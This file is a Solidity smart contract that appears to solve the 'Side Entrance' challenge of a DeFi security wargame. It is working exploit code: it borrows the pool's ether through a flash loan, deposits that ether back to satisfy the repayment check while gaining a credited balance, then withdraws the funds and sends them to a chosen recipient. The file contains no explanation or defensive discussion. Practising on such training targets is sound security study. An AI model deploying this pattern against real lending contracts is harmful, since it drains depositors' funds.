// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";


contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;
    address payable private recipient;

    constructor(address _address, address payable _recipient){
        pool = SideEntranceLenderPool(_address);
        recipient = _recipient;

    }

    function attack(uint256 _amount) external{
        pool.flashLoan(_amount);
    }

    function execute() external payable override{
        pool.deposit{value: msg.value}();
    }
    
    function withdrawAndSend() external{
        pool.withdraw();
        (bool success, ) = recipient.call{value: address(this).balance}("");
        require(success, "Tx failed! ");
    }

    receive() external payable{

    }


}
